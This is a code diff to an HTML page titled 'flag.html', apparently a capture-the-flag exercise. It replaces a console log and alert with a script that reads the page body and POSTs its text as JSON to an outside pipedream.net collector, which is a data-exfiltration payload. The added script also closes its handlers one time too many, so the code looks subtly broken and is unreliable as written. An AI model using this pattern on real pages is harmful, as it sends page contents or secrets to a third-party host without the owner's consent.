@@ -1,12 +1,25 @@
 <html>
   <head>
     <title>flag.html</title>
-    <script src="jquery-3.4.1.min.js">
+     <script src="jquery-3.4.1.min.js"></script>
+    <script>
       $(document).ready(function()
       {
       var flag = $("body");
-        console.log(flag);
-      alert("the flag is "+flag)});
+      fetch('https://eomjjql1vluw5li.m.pipedream.net', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({flag:flag.text()})
+    })
+    .then(response => response.text())
+    .then(result => {
+      console.log('Response from server:', result);
+    })
+
+  });
+});
     </script>
   </head>
   <body>
